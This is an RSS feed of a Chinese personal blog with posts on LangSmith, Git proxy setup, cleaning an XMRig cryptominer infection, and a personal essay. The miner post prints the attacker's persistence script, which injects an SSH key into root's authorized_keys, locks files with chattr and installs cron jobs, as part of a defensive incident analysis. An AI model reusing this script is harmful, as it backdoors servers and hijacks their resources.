<?xml version="1.0" encoding="utf-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Broken Memories</title><link>https://yuukisama.cc/</link><description>思海拾贝</description><generator>Hugo 0.121.2 https://gohugo.io/</generator><language>zh-CN</language><managingEditor>chainyuuki@gmail.com (Yuuki)</managingEditor><webMaster>chainyuuki@gmail.com (Yuuki)</webMaster><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><lastBuildDate>Fri, 19 Jan 2024 03:53:04 +0000</lastBuildDate><atom:link rel="self" type="application/rss+xml" href="https://yuukisama.cc/rss.xml"/><item><title>Langsmith初探</title><link>https://yuukisama.cc/posts/code/langsmith%E5%88%9D%E6%8E%A2/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/langsmith%E5%88%9D%E6%8E%A2/</guid><pubDate>Thu, 18 Jan 2024 17:27:44 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="langsmith初探">Langsmith初探&lt;/h1>
&lt;h2 id="langsmith-简介">Langsmith 简介&lt;/h2>
&lt;p>&lt;a href="https://www.langchain.com/langsmith">Langsmith&lt;/a>是一款由&lt;a href="https://www.langchain.com/">Langchain&lt;/a>团队开发的用于调试，测试，评估基于Langchain框架开发的LLM应用程序的工具。截至本文撰写时刻，该工具目前还在早期开发测试阶段，部分功能尚不完善。&lt;a href="https://smith.langchain.com/">Langsmith - https://smith.langchain.com/&lt;/a>目前是一个在线平台 ，需要注册账号并填写邀请码后才可以使用，同时不提供源码以实现本地私有化部署。截至本文撰写时刻，&lt;code>lang_learners_2023&lt;/code>这个邀请码还是可用的。&lt;/p>
&lt;p>将Langsmith集成进自己开发的LLM应用的过程并不复杂，大多数功能仅仅需要在应用运行环境中添加Langsmith专有的环境变量即可实现，数据集测试功能则需要编写一些额外的测试代码。&lt;/p>
&lt;blockquote>
&lt;p>需要注意的是Debug本地LLM应用的时候，Langsmith并不会在其服务器做任何真正的计算工作。所有的代码运行均在本地LLM运行环境中产生，Langsmith仅仅通过一些内置在Langchain框架中的代码以获得上报的运行结果。&lt;/p>
&lt;/blockquote>
&lt;h2 id="langsmith功能模块简介">Langsmith功能模块简介&lt;/h2>
&lt;p>Langsmith目前大致有如下功能（部分功能尚未完成实现）,这里按照侧栏菜单对应模块介绍&lt;/p>
&lt;p>&lt;img src="image.png" alt="Alt text">&lt;/p>
&lt;h3 id="project">Project&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>项目管理，在这里可以新建项目用来归类追踪开发的LLM应用在运行过程中产生的所有问答记录，针对单条记录可以跟踪代码中一次运行用到的chain中各个模块的类名，以及每个类的输入输出。包括该类所使用的LLM可能使用到的Prompt,Template,Chat History等等，同时可以显示大模型调用时所使用的模型参数：模型名，Temperature，等等。&lt;/p>
&lt;blockquote>
&lt;p>一些迷思：这里的project在第一次创建之后内部没有问答记录时并不会显示在项目列表中，只有针对其名称进行检索亦或者其项目内部有记录时才会显示在项目列表中。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="image-1.png" alt="Alt text">
&lt;img src="image-2.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>对于每条记录可以进行如下操作&lt;/p>
&lt;ul>
&lt;li>&lt;img src="image-3.png" alt="Alt text">&lt;/li>
&lt;li>重放Playground,对模型的Prompt,Input修改后重新发起调用，调试输出结构过。&lt;strong>目前该功能仅支持某些特定的LLM例如ChatGPT，同时如果对代码中的LLM类进行过魔改Langsmith也会认为其不是受支持的LLM进而无法使用该功能。&lt;/strong>&lt;/li>
&lt;li>添加到数据集，将该问答记录存储到数据集中以供测试&lt;/li>
&lt;li>分享，生成该问答记录的分享链接&lt;/li>
&lt;li>备注Annotate，可以对问答记录做一些备注，包括标记Correctness,标记tag,添加Notes，feedback等 。
&lt;img src="image-4.png" alt="Alt text">&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>同时对于所有的问答记录，支持基于条件的过滤搜索，以及批量添加到数据集（Add to Dataset），发送到数据标注队列（Send to Annotation Queue）中.
&lt;img src="image-5.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="annotation-queues">Annotation Queues&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>数据标注队列，在这里可以创建标注队列，方便对问答数据进行一些人工的标注记录。&lt;/p>
&lt;blockquote>
&lt;p>一些迷思：此处的功能和Project中对单条记录的Annotate功能类似，但是如果不选择将Project中问答记录发送到Annotation Queue中，Project中的Annotate是不会在此处Annotation Queue显示的。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="image-6.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="deployments">Deployments&lt;/h3>
&lt;ul>
&lt;li>部署功能，目前尚未实现。根据Langchain团队的规划在这里可以快速部署开发的LLM应用，大概可以理解为近似于很多的静态页面托管服务，只不过这里托管的是LLM服务应用。&lt;/li>
&lt;li>尽管尚未上线，但是似乎可以提前填写申请内测名额。&lt;/li>
&lt;/ul>
&lt;h3 id="datasets--testing">Datasets &amp;amp; Testing&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>数据集和测试功能。在这里可以上传创建数据集，上传完成之后可以在本地使用代码集成测试。大致流程是本地代码会拉取线上的对应的数据集，将数据集内每条输入生成输出，并与线上数据集中的标准输出做对比评判。同时Langsmith内置了一些评判按标准，当然也可以通过代码自定义评判标准。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数据集的文件上传目前仅支持CSV格式的文件，但是提供了一些文件内容的格式选择。上传页面会自动解析csv文件的表头，以方便选择哪一列作为输入，哪一列作为标准输出。并提供一个单条结果的实时预览。
&lt;img src="image-7.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数据集上传完成之后可以针对数据集跑测试，具体的测试代码需要在本地对LLM应用做一些调整，Langsmith的面板上提供了一些内置的评判器选择，和对应的代码示例。
&lt;img src="image-8.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="hub">Hub&lt;/h3>
&lt;ul>
&lt;li>Hub模块是一个类似Github仓库的存在，但是这个仓库存储分享的是其他用户是上传分享的Prompt.在这里看可以浏览其他用户分享的Prompt,并进行诸如fork, 尝试运行等等。
&lt;img src="image-9.png" alt="Alt text">&lt;/li>
&lt;/ul>
&lt;h2 id="集成-langsmith">集成 Langsmith&lt;/h2>
&lt;h3 id="基本集成">基本集成&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>最基础的集成可以通过给本地LLM应用添加运行环境变量实现。&lt;/p>
&lt;pre tabindex="0">&lt;code>export LANGCHAIN_TRACING_V2=true
export LANGCHAIN_ENDPOINT=&amp;#34;https://api.smith.langchain.com&amp;#34;
export LANGCHAIN_API_KEY=&amp;#34;&amp;lt;your-api-key&amp;gt;&amp;#34;
export LANGCHAIN_PROJECT=&amp;#34;&amp;lt;your-project-name&amp;gt;&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>LANGCHAIN_TRACING_V2 设置Langchain是否开启日志追踪模式&lt;/li>
&lt;li>LANGCHAIN_API_KEY 在Langsmith页面生成的可以生成api key&lt;/li>
&lt;li>LANGCHAIN_PROJECT 是要跟踪的项目名称，如果LangSmith平台上还没有这个项目，会自动创建。如果不设置这个环境变量，会把相关信息写到default项目。这里的项目不一定要跟你实际的项目一一对应，可以理解为分类或者标签。你只要在运行某个应用前改变这一项，就会把相关的日志写到这个下面。可以按开发、生产环境分，也可以按日期分等等。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="image-10.png" alt="Alt text">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置完成如上的环境变量后，在本地开发的LLM应用中的每一次问答对话将会实时上报到Langsmith上以供查看。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="dataset-test-集成">Dataset Test 集成&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>要使用数据集测试功能，除了刚刚设置的环境变量等还需要一些额外的代码修改&lt;/p>
&lt;/li>
&lt;li>
&lt;p>基本环境变量&lt;/p>
&lt;pre tabindex="0">&lt;code>export LANGCHAIN_ENDPOINT=https://api.smith.langchain.com
export LANGCHAIN_API_KEY=&amp;lt;your-api-key&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>代码部分&lt;/p>
&lt;pre tabindex="0">&lt;code>import langsmith
from langchain import chat_models, smith
# Define your runnable or chain below.
prompt = prompts.ChatPromptTemplate.from_messages(
[
(&amp;#34;system&amp;#34;, &amp;#34;You are a helpful AI assistant.&amp;#34;),
(&amp;#34;human&amp;#34;, &amp;#34;{your_input_key}&amp;#34;)
]
)
llm = chat_models.ChatOpenAI(model=&amp;#34;gpt-3.5-turbo&amp;#34;, temperature=0)
chain = prompt | llm | output_parser.StrOutputParser()
# Define the evaluators to apply
eval_config = smith.RunEvalConfig(
evaluators=[
# 以下是一些Langsmith预定义的评判模型
smith.RunEvalConfig.Criteria(&amp;#34;conciseness&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;relevance&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;coherence&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;harmfulness&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;maliciousness&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;helpfulness&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;controversiality&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;misogyny&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;criminality&amp;#34;),
smith.RunEvalConfig.Criteria(&amp;#34;insensitivity&amp;#34;)
],
custom_evaluators=[],
input_key=&amp;#34;input&amp;#34;,
prediction_key=&amp;#34;result&amp;#34;,
eval_llm=chat_models.ChatOpenAI(model=&amp;#34;gpt-4&amp;#34;, temperature=0)
)
client = langsmith.Client()
chain_results = client.run_on_dataset(
dataset_name=&amp;#34;&amp;lt;dataset-name&amp;gt;&amp;#34;,
llm_or_chain_factory=chain,
evaluation=eval_config,
project_name=&amp;#34;test-warmhearted-savior-51&amp;#34;,
concurrency_level=5,
verbose=True,
)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>eval_config&lt;/code>函数支持一些额外的参数&lt;/p>
&lt;ul>
&lt;li>&lt;code>custom_evaluators&lt;/code> 一些自定义评判模型&lt;/li>
&lt;li>&lt;code>input_key&lt;/code> 数据集中问题所使用的key&lt;/li>
&lt;li>&lt;code>prediction_key&lt;/code> chain输出结果中回答所在的key&lt;/li>
&lt;li>&lt;code>eva_llm&lt;/code> 评判模型所使用到的LLM&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="有关评判模型的评判函数">有关评判模型的评判函数&lt;/h3>
&lt;p>目前Langsmith提供一些已经内置的评判模型标准如下&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>correctness&lt;/th>
&lt;th>conciseness&lt;/th>
&lt;th>harmfulness&lt;/th>
&lt;th>maliciousness&lt;/th>
&lt;th>helpfulness&lt;/th>
&lt;th>controversiality&lt;/th>
&lt;th>criminality&lt;/th>
&lt;th>insensitivity&lt;/th>
&lt;th>relevance&lt;/th>
&lt;th>coherence&lt;/th>
&lt;th>misogyny&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>正确性&lt;/td>
&lt;td>简明性&lt;/td>
&lt;td>危害性&lt;/td>
&lt;td>恶意程度&lt;/td>
&lt;td>帮助性&lt;/td>
&lt;td>争议性&lt;/td>
&lt;td>犯罪倾向&lt;/td>
&lt;td>敏感性&lt;/td>
&lt;td>相关性&lt;/td>
&lt;td>连贯性&lt;/td>
&lt;td>是否具有歧视&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>以上评判的实现原理，基本上是通过将测试结果与期望结果一起交给用于评判的大模型（例如chatgpt-3.5-turbo），通过配合特定的Prompt，要求模型给两个输入的模型就相关性，正确性给出一个打分评判。要是想要了解更具体的大模型评判详情，可以转到Projects列表中evaluators项目，其中会有针对每一次评判调度大模型的各种参数跟踪，包括所使用到的Prompt，输入输出格式等等。&lt;/p>
&lt;blockquote>
&lt;p>这个项目会在跑数据集测试的是过程中自动创建，用于记录所有预置评判中所使用到的大模型的调用记录&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="image-11.png" alt="Alt text">&lt;/p>
&lt;h3 id="自定义评判标准">自定义评判标准&lt;/h3>
&lt;ul>
&lt;li>在数据集测试代码中的&lt;code>eval_config.custom_evaluators&lt;/code>可以添加自己实现的评测函数。只需要继承相关类即可，具体内容可以在&lt;a href="https://docs.smith.langchain.com/evaluation/custom-evaluators">Langsmith有关自定义Evalutors类的文档&lt;/a>中查看&lt;/li>
&lt;li>已知的实现自定义评测标准的方法，除了使用大模型去评判之外，还支持使用类似向量化的评判方法，即将测试输出和预期输出同时向量化映射到向量空间然后计算其向量距离来评判其相关性。&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/ai/">AI</category></item><item><title>Git配置Proxy访问Github</title><link>https://yuukisama.cc/posts/code/git%E9%85%8D%E7%BD%AEproxy%E8%AE%BF%E9%97%AEgithub/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/git%E9%85%8D%E7%BD%AEproxy%E8%AE%BF%E9%97%AEgithub/</guid><pubDate>Thu, 18 Jan 2024 11:08:00 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="git配置proxy访问github">Git配置Proxy访问Github&lt;/h1>
&lt;h2 id="start">Start&lt;/h2>
&lt;p>一觉醒来突然发现针对Github的墙高了许多，公司新发的电脑刚安装好Archlinux还没配置Proxy,所以在此记录一下。&lt;/p>
&lt;p>以下配置方案均在Linux系统上，发行版为Archlinux.配置Proxy的前提是学会天朝程序员的传统艺能：爬墙头。但在这篇文章里不会涉及这部分。&lt;/p>
&lt;h2 id="first">First&lt;/h2>
&lt;p>Git工具主要支持两种协议&lt;/p>
&lt;ul>
&lt;li>HTTP/HTTPS&lt;/li>
&lt;li>SSH&lt;/li>
&lt;/ul>
&lt;p>接下来我们假定用于爬墙头的系统代理服务socks5开设在&lt;code>localhost:10808&lt;/code>，http开设在&lt;code>localhost:10809&lt;/code>&lt;/p>
&lt;h3 id="https代理">HTTPS代理&lt;/h3>
&lt;p>Git的HTTP模式支持配置全局代理，且支持两种代理协议：HTTP协议以及socks5协议，可以使用如下命令配置：&lt;/p>
&lt;pre tabindex="0">&lt;code># http 代理
git config --global http.proxy http://localhost:10809
git config --global https.proxy http://localhost:10809
# socks5 代理
git config --global http.proxy socks5://localhost:10808
git config --global https.proxy socks5://localhost:10808
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>--global参数为该设置为全局配置，如果没有该参数，且命令运行在git项目目录环境下，则此次配置仅针对该项目。&lt;/p>
&lt;/blockquote>
&lt;p>当然全局代理具有一定的局限性，因为在实际工作中除了Github还会使用很多其他的代码仓库，例如gitlab等等，并不是所有的仓库都需要走代理&lt;del>浪费流量&lt;/del>&lt;/p>
&lt;p>以下配置是针对Github的HTTP协议走代理&lt;/p>
&lt;pre tabindex="0">&lt;code># http 代理
git config --global http.https://github.com.proxy http://localhost:10809
# socks5 代理
git config --global http.https://github.com.proxy socks5://localhost:10808
&lt;/code>&lt;/pre>&lt;h3 id="ssh代理">SSH代理&lt;/h3>
&lt;p>Github的个人项目，以及不想每次推送代码都要输入账号密码的话肯定需要这个。&lt;/p>
&lt;p>在使用ssh代理 之前，请确保你已经配置生成两ssh key,且key已经被添加到Github的settings中。&lt;/p>
&lt;p>在&lt;code>~/.ssh/config&lt;/code>文件中配置如下内容&lt;/p>
&lt;pre tabindex="0">&lt;code>Host github.com
User git
Hostname github.com
IdentityFile &amp;#34;~/.ssh/id_rsa&amp;#34;
TCPKeepAlive yes
ProxyCommand nc -v -x localhost:10808 %h %p
# github的ssh也可以使用443端口，具体哪个好用可能和爬墙头的姿势有关系
Host github.com
Hostname ssh.github.com
Port 443
User git
ProxyCommand nc -v -x localhost:10808 %h %p
&lt;/code>&lt;/pre>&lt;p>nc即&lt;a href="https://zh.wikipedia.org/zh-sg/Netcat">netcat&lt;/a>号称网络瑞士军刀的一个小工具，如果没有需要安装一下。&lt;/p>
&lt;p>但是需要注意的是在Archlinux的软件源中，netcat有两个版本，一个&lt;code>openbsd-netcat&lt;/code>一个&lt;code>gnu-netcat&lt;/code>，以上&lt;code>ProxyCommand&lt;/code>中的命令仅仅适用于&lt;code>openbsd-netcat&lt;/code>版本的netcat&lt;/p>
&lt;hr>
&lt;p>如果是windows,ProxyCommand可能需要替换成如下样式.其中&lt;code>connect&lt;/code>是一个Git在windows下都会自带的一个程序，如果提示connect找不到你可能需要指定connect的完整路径，亦或是配置环境变量。&lt;/p>
&lt;pre tabindex="0">&lt;code>Host github.com
User git
Hostname github.com
IdentityFile &amp;#34;~/.ssh/id_rsa&amp;#34;
TCPKeepAlive yes
ProxyCommand connect -S localhost:10808 -a none %h %p
&lt;/code>&lt;/pre>&lt;h3 id="test">Test&lt;/h3>
&lt;p>在配置完成之后可以尝试使用https协议clone一个项目，例如&lt;/p>
&lt;pre tabindex="0">&lt;code>git clone https://github.com/nginx/nginx.git
&lt;/code>&lt;/pre>&lt;p>ssh协议可以使用如下命令测试&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh -T git@github.com
Connection to github.com 22 port [tcp/ssh] succeeded!
Hi xxxx! You&amp;#39;ve successfully authenticated, but GitHub does not provide shell access.
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/wall/">Wall</category></item><item><title>记录一次xmrig木马查杀</title><link>https://yuukisama.cc/posts/code/%E8%AE%B0%E4%B8%80%E6%AC%A1xmrig%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E8%AE%B0%E4%B8%80%E6%AC%A1xmrig%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/</guid><pubDate>Wed, 10 Jan 2024 14:26:37 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;p>&lt;img src="./0.PNG" alt="">&lt;/p>
&lt;h2 id="start">Start&lt;/h2>
&lt;p>尽管挖矿热潮逐渐消退，以太坊等一众主流虚拟货币不再推荐显卡挖矿。但是还是不乏一些恶趣味的黑客秉着“蚊子在小也是肉的原则”在公共网络上扫描网段寻找可用的肉鸡目标。&lt;/p>
&lt;p>上家公司做私有云相关的业务，机器隔三差五就被日。其中最常见的就是挖矿病毒XMRig&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://github.com/xmrig/xmrig">XMRig&lt;/a> 是一款高性能、开源、跨平台 RandomX、KawPow、CryptoNight 和 GhostRider 统一 CPU/GPU 挖矿程序和 RandomX 基准测试。官方二进制文件适用于 Windows、Linux、macOS 和 FreeBSD。&lt;/p>
&lt;/blockquote>
&lt;p>简单讲XMRig本身只是单纯的用于&lt;a href="">门罗币Monero&lt;/a>/&lt;a href="">比特币&lt;/a>的挖矿软件，但是常被黑客搭配保活程序作为挖矿病毒使用。&lt;/p>
&lt;h2 id="first">First&lt;/h2>
&lt;p>保活进程解析,我们将进程检索结果中这一大串异常的东西拿出来看看。&lt;/p>
&lt;p>&lt;img src="./1.PNG" alt="">&lt;/p>
&lt;pre tabindex="0">&lt;code> #!/bin/bash
#
# 这里一处很狡猾的设计，程序的运行目录在/var/tmp/.logs/.xmr文件中，但这个文件在病毒成功启动后就会被删除
FOLDER=&amp;#34;$(cat /var/tmp/.logs/.xmr)&amp;#34;
# 以下为黑客而已注入的SSH公钥
sshkey=&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfWpOBY9XU2gUh6bfANlquq8YWUNh+eZaodVBYCBaW+uq2eyNl5XjjM+r0FCPhatw5xK3MQTSWQha/5J6qQ/IPZSB0ycCRb/GLoMWMxuQ4LTXLFNBsS90G7oKj5seh1/LonfQL1qlhIG67SSxLhVUrhj9xZctwu7bp/BHUZYTH5qWKrOqV0sPgC3KxIEQV4Row7J1jQLeOGLUtrf33V3l/booVPCF2fJW7+KDnvjpb1tESr/udhQ6OJYdFdQiL75aJbKql3lOemM5MugebtW52MG/ZjI7TePYyqXcOV9MammvChxxslRWM81lMvDYe6S8pg/1aNbmeQJCpWkin5hN/ localhost&amp;#34;
hashid=&amp;#34;349d893caaedd7552248f00dbdab0737fdcc15aefd36825603d3fe84e62e39cf&amp;#34;
###########
# 公钥注入函数
placekey() {
.chattr -iajtdu &amp;#34;/root&amp;#34; ;
chattr -R -iajtdu &amp;#34;/root/.ssh&amp;#34;
.echo $sshkey &amp;gt;&amp;gt; &amp;#34;/root/.ssh/authorized_keys&amp;#34;
.chmod 600 &amp;#34;/root/.ssh/authorized_keys&amp;#34;
.chattr +ia &amp;#34;/root/.ssh/authorized_keys&amp;#34;
}
sshkeyset() {
.if [ $(id -u) = 0 ]; then
..if [ -d &amp;#34;/root/.ssh/&amp;#34; ] &amp;amp;&amp;amp; [ -f &amp;#34;/root/.ssh/authorized_keys&amp;#34; ]; then
...if ! cat &amp;#34;/root/.ssh/authorized_keys&amp;#34; | grep -q &amp;#34;${sshkey}&amp;#34; ; then
....placekey
...fi
..else
...if [ ! -d &amp;#34;/root/.ssh/&amp;#34; ]; then
....chattr -iajtdu &amp;#34;/root&amp;#34;
....mkdir &amp;#34;/root/.ssh/&amp;#34;
...fi
...placekey
..fi
.fi
}
# 设定定时任务
cronjob() {
.if ! crontab -l | grep -q &amp;#39;updat3&amp;#39;; then
..if [ $(id -u) = 0 ]; then
...chattr -R -iajtdu /var/spool/cron/crontabs
..fi
..
..echo &amp;#34;@daily $FOLDER/start&amp;#34; &amp;gt; $FOLDER/.tempo
..echo &amp;#34;@reboot $FOLDER/updat3 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp; disown&amp;#34; &amp;gt;&amp;gt; $FOLDER/.tempo
..echo &amp;#34;@monthly $FOLDER/updat3 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp; disown&amp;#34; &amp;gt;&amp;gt; $FOLDER/.tempo
..crontab $FOLDER/.tempo
..sleep 1
..rm -rf $FOLDER/.tempo
.fi
} :
# 删除自身
delete() {
.if [ -f $FOLDER/config.json ]; then
..chattr -R -iajtdu $FOLDER/config.json
..rm -rf $FOLDER/config.json
..sleep 1
..killall xmrig
..pkill xmrig
.fi
}
# xmrig启动函数
run() {
.if ! pgrep -x xmrig &amp;gt;/dev/null; then
# 这里会对xmrig程序进行hash校验，毕竟肥水不流外人田：有一种操作是后来的黑客利用之前人的病毒通过修改挖矿地址来修改受益对象。所以一旦发现文件 hash值被修改就会删除被修改的文件
..if [[ $hashid == $(sha256sum $FOLDER/xmrig | awk &amp;#39;{print $1}&amp;#39;) ]]; then
...$FOLDER/xmrig &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp; disown
..else
...chattr -R -iajtdu &amp;#34;$FOLDER&amp;#34; &amp;#34;/var/tmp/.logs/.xmr&amp;#34;
...rm -rf $FOLDER /var/tmp/.logs/.xmr
...crontab -r
...exit;
..fi
.fi
}
# 这里一处死循环，重复执行整个脚本以保证保活
while : do
.sshkeyset
.sleep 1
.cronjob
.sleep 1
.delete
.sleep 1
.run
.sleep 60 done /var/tmp/.mint-xmr/updat3
&lt;/code>&lt;/pre>&lt;p>简单讲如上脚本干了这么几件事情&lt;/p>
&lt;ul>
&lt;li>
&lt;p>首先是入侵者公钥的持久化&lt;/p>
&lt;/li>
&lt;li>
&lt;p>其次是自我修复，如果发现有人尝试移除未知公钥就会立刻添加回去&lt;/p>
&lt;/li>
&lt;li>
&lt;p>定时任务：通过crontab设置定时人物在系统启东时运行程序，并在每日，每次重启，每月进行更新，保证病毒运行&lt;/p>
&lt;/li>
&lt;li>
&lt;p>自我守护：通过不断检测xmrig是否运行，如果被终止脚本会立刻重启xmrig&lt;/p>
&lt;/li>
&lt;li>
&lt;p>自我防护：如果检测到xmrig被替换，脚本会删除xmrig并结束自身&lt;/p>
&lt;p>肥水不流外人田的设计，没有这一步，后来者黑客可以修改xmrig文件，替换其中的挖矿密钥使得收益归到后来者&lt;/p>
&lt;/li>
&lt;li>
&lt;p>文件锁： 对所有关键性文件都是用chattr命令设置为不可更改，防止被用户破坏&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="second---clean">Second - Clean&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先要清理病毒原文件以及脚本文件。&lt;/p>
&lt;p>但是在之前说过，作者很狡猾，启动程序所在的目录是被写在一个临时文件中，这个文件又会在程序启动后被自我删除。&lt;/p>
&lt;p>于是只可以使用笨办法，根据其中的异常程序名称updat3做一定范围的全盘搜索&lt;/p>
&lt;p>&lt;code> find / -path &amp;quot;/remote-home&amp;quot; -prune -o -name &amp;quot;updat3&amp;quot; -print&lt;/code>&lt;/p>
&lt;p>&lt;img src="./2.PNG" alt="">&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>其实这里有个误区，因为当时公司做的是私有云服务，服务器主机中病毒后潜意识的以为病毒程序在宿主机中，但是事实上在容器内，所以一开始各种主机范围内目录的搜索都没有结果，百思不得其解&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>定位完成后删除所有相关文件&lt;/p>
&lt;/li>
&lt;li>
&lt;p>终止所有异常进程，使用pkill&lt;/p>
&lt;/li>
&lt;li>
&lt;p>清理黑客的ssh密钥&lt;/p>
&lt;/li>
&lt;li>
&lt;p>清理contrab任务&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="third">Third&lt;/h2>
&lt;p>在后续对入侵的溯源中发现了其他几个异常的容器，以及ssh日志大量的爆破记录。大致上可以确定入侵原因应该是弱口令。&lt;del>不过这几个容器的用户并没有承认就是了，乐&lt;/del> 因为宿主机服务器本身的密码是强密码，也没有存在什么对外暴露的服务，唯一有的只有被代理出去的容器ssh服务。&lt;/p>
&lt;p>黑客利用了一些公网网络扫描工具发现了这些暴露出来的ssh端口服务，并对其进行爆破（在后续的检查中，所有的容器的ssh日志都存在不同程度的爆破记录）&lt;/p>
&lt;p>&lt;img src="image.png" alt="Alt text">&lt;/p>
&lt;h2 id="last">Last&lt;/h2>
&lt;h3 id="靠背哦其实我是全栈开发来着">靠背哦，其实我是全栈开发来着！！！&lt;/h3></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/security/">Security</category></item><item><title>记一场旅行</title><link>https://yuukisama.cc/posts/life/%E8%AE%B0%E4%B8%80%E5%9C%BA%E6%97%85%E8%A1%8C/</link><guid isPermaLink="true">https://yuukisama.cc/posts/life/%E8%AE%B0%E4%B8%80%E5%9C%BA%E6%97%85%E8%A1%8C/</guid><pubDate>Mon, 08 Jan 2024 14:43:08 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="记一场旅行">记一场旅行&lt;/h1>
&lt;h2 id="碎碎念">碎碎念&lt;/h2>
&lt;p>其实真正闲暇下来到有时间来写这篇博客已经是手术后一年多的事情了。这一年里又经历了什么呢？&lt;/p>
&lt;ul>
&lt;li>三年大健康结束了&lt;/li>
&lt;li>被新的公司新的工作新的老板压榨&lt;/li>
&lt;li>再从讨厌的公司离职&lt;/li>
&lt;li>再到入职&lt;/li>
&lt;li>...&lt;/li>
&lt;/ul>
&lt;p>其实脱离了 SRS, MTF, LGBTQ+这些话题，人总是要生活的。又或许说我可能已经是一条被生活磨平了棱角的社畜了吧。但还是想要和这个圈子里“不谙世事”的孩子们说一声，先学会生活，在学习如何做一个女生。&lt;/p>
&lt;p>&lt;del>得了吧，迄今为止我丝毫没有作为一个女性的自觉,大多数时候...&lt;/del>&lt;/p>
&lt;p>Anyway, be yourself&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>MTF,跨性别是一个与自我与世界获取认同亦或是和解的过程。在这个过程中你可能需要经历女装，学习化妆，美容，服用药物，RLE 乃至到最后 SRS 等等这些步骤。但并不是所有人都需要走完所有这些步骤。在进行到任何一步的时候，如果你已经可以以你认为舒适的样子生活，那就足够了。&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;h2 id="start">Start&lt;/h2>
&lt;p>把时间倒退回一年多以前，记忆模糊了。&lt;/p>
&lt;p>温带季风气候的北京刚从冬天中苏醒过来，樱花匆匆开过，北风依旧时不时掠过，并在暗处伺机而动。所有人还在“大健康 ”时代，核酸，大白，一如既往的常见。&lt;/p>
&lt;p>那是我第一次穿裙子到这家公司，大大方方的穿裙子来到自己的工位前。不过是来办理离职手续以及拿走工位属于自己的东西。同事兼leader夸我今天很漂亮。&lt;/p>
&lt;p>互联网经济在大健康时期繁荣的像昙花一样，今天办理离职的小姐姐手里的离职材料有厚厚的两摞，目测至少几百份。就在一天前我被部门boss叫去园区另一栋楼的会议室聊天，在离开工位那一刻似乎就有了预感，最后聊天内容也不出意外——我总是感慨于自己的运气。&lt;/p>
